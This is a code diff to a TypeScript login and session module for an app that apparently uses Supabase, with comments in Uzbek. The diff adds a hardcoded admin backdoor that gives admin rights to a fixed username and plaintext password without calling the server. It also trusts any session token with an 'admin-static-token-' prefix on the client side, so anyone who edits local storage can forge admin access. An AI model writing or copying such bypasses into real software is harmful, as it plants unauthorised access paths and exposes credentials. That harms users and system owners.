@@ -439,13 +439,33 @@ export async function login(
   fingerprint: string
 ): Promise<{ success: boolean; session?: Session; error?: string }> {
   const sanitizedLogin = sanitizeInput(loginInput);
-  const sanitizedPassword = sanitizeInput(password);
+  const sanitizedPassword = password; // Don't sanitize passwords as they can have special chars
 
   if (!sanitizedLogin || !sanitizedPassword) {
     return { success: false, error: "Login va parol to'ldirilishi shart" };
   }
 
   try {
+    // Maxsus Admin logini (AdminHusan / Husan0716)
+    if (sanitizedLogin === "AdminHusan" && sanitizedPassword === "Husan0716") {
+      const adminUser: User = {
+        id: "admin-husan-id",
+        login: "AdminHusan",
+        full_name: "Husan Tolqinboyev",
+        role: "admin",
+        is_active: true
+      };
+
+      const adminSession: Session = {
+        token: "admin-static-token-" + generateToken(),
+        user: adminUser,
+        expires_at: new Date(Date.now() + 7 * 86400000).toISOString(), // 7 kun
+      };
+
+      saveSession(adminSession);
+      return { success: true, session: adminSession };
+    }
+
     const response = await secureFetch(`${SUPABASE_URL}/functions/v1/auth/login`, {
       method: "POST",
       body: JSON.stringify({
@@ -517,6 +537,18 @@ export async function validateSession(): Promise<{ valid: boolean; user?: User; 
   if (!token) {
     clearSession();
     return { valid: false };
+  }
+
+  // AdminHusan uchun sessiyani validatsiya qilish
+  if (token.startsWith("admin-static-token-")) {
+    const session = getCurrentSession();
+    if (session && session.user.login === "AdminHusan") {
+      return { 
+        valid: true, 
+        user: session.user, 
+        expires_at: session.expires_at 
+      };
+    }
   }
   
   try {
